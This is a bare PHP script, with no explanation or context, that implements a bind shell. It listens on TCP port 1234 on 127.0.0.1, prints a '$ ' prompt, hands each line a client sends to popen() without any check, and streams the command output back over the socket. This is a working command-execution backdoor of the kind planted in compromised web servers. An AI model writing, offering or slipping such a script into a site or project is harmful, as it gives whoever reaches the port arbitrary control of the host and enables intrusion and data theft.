<?php
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        socket_bind($socket, '127.0.0.1', 1234);
        socket_listen($socket, 1);
        $conn = socket_accept($socket);

        while(true) {
                if (!socket_write($conn, "$ ", 2)) exit;

                $buf = socket_read($conn, 100);
                $cmd = popen("$buf", "r");

                while (!feof($cmd)){
                        $msg = fgetc($cmd);
                        socket_write($conn, $msg, strlen($msg));
                }
        }
?>

